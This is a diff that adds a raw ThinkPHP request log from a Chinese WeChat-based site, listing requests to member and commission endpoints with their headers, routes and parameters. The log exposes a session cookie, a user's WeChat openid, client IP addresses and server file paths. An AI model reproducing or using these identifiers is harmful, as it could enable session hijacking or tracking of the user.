+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.jiajiazxgg.com/index.html',
+  'x-requested-with' => 'com.tencent.mm',
+  'content-type' => 'application/json;charset=utf-8',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.1.0; OPPO R11s Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1054 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/plain, */*',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'openid' => 'oXgpTt9aAfQ8-C4i89xe8MjWvpAc',
+)
+[ info ] [ RUN ] app\handle\controller\Index->collage_tips[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T22:57:12+08:00 ] 172.17.142.12 27.186.142.226 GET /index.php/handle/member/fx_lists?openid=oXgpTt9aAfQ8-C4i89xe8MjWvpAc
+[ info ] www.jiajiazxgg.com/index.php/handle/member/fx_lists?openid=oXgpTt9aAfQ8-C4i89xe8MjWvpAc [运行时间：0.036583s][吞吐率：27.34req/s] [内存消耗：2,630.50kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'member',
+    2 => 'fx_lists',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=h36hmbr32fh4dmld7tmq56r230',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.jiajiazxgg.com/index.html',
+  'x-requested-with' => 'com.tencent.mm',
+  'content-type' => 'application/json;charset=utf-8',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.1.0; OPPO R11s Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1054 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/plain, */*',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'openid' => 'oXgpTt9aAfQ8-C4i89xe8MjWvpAc',
+)
+[ info ] [ RUN ] app\handle\controller\Member->fx_lists[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Member.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T22:57:14+08:00 ] 172.17.142.12 27.186.142.226 GET /index.php/handle/member/agent_money_lists?openid=oXgpTt9aAfQ8-C4i89xe8MjWvpAc
+[ info ] www.jiajiazxgg.com/index.php/handle/member/agent_money_lists?openid=oXgpTt9aAfQ8-C4i89xe8MjWvpAc [运行时间：0.036467s][吞吐率：27.42req/s] [内存消耗：2,630.74kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'member',
+    2 => 'agent_money_lists',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=h36hmbr32fh4dmld7tmq56r230',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.jiajiazxgg.com/index.html',
+  'x-requested-with' => 'com.tencent.mm',
+  'content-type' => 'application/json;charset=utf-8',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.1.0; OPPO R11s Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1054 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/plain, */*',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'openid' => 'oXgpTt9aAfQ8-C4i89xe8MjWvpAc',
+)
+[ info ] [ RUN ] app\handle\controller\Member->agent_money_lists[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Member.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T22:57:17+08:00 ] 172.17.142.12 27.186.142.226 GET /index.php/handle/member/collage_lists?openid=oXgpTt9aAfQ8-C4i89xe8MjWvpAc
+[ info ] www.jiajiazxgg.com/index.php/handle/member/collage_lists?openid=oXgpTt9aAfQ8-C4i89xe8MjWvpAc [运行时间：0.037701s][吞吐率：26.52req/s] [内存消耗：2,630.68kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'member',
+    2 => 'collage_lists',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=h36hmbr32fh4dmld7tmq56r230',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.jiajiazxgg.com/index.html',
+  'x-requested-with' => 'com.tencent.mm',
+  'content-type' => 'application/json;charset=utf-8',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.1.0; OPPO R11s Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1054 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/plain, */*',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'openid' => 'oXgpTt9aAfQ8-C4i89xe8MjWvpAc',
+)
+[ info ] [ RUN ] app\handle\controller\Member->collage_lists[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Member.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T23:11:50+08:00 ] 172.17.142.12 101.133.155.170 GET /
+[ info ] 39.106.3.107/ [运行时间：0.026330s][吞吐率：37.98req/s] [内存消耗：1,719.59kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '39.106.3.107',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T23:49:38+08:00 ] 172.17.142.12 94.247.172.129 GET /
+[ info ] www.jiajiazxgg.com/ [运行时间：0.019692s][吞吐率：50.78req/s] [内存消耗：1,720.19kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2)',
+  'host' => 'www.jiajiazxgg.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
